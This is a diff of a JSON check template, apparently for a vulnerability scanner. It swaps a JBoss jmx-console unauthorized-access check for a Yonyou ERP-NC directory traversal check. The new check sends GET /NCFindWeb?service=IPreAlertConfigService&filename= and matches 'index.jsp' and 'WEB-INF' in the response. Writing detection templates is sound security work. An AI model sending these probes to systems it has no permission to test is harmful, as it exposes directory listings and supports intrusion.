@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Yonyou ERP-NC Directory Traversal Vulnerability",
+    "Description": "Yonyou ERP-NC Directory Traversal Vulnerability",
+    "Product": "Yonyou",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/NCFindWeb?service=IPreAlertConfigService&filename=",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,12 +18,13 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
+                "Value": "index.jsp"
+                },
+                {
+                 "Operation": "contains", 
+                 "Key":"",
+                 "Value": "WEB-INF"
+                 },
                  {
                 "Operation": "code", 
                 "Key":"",
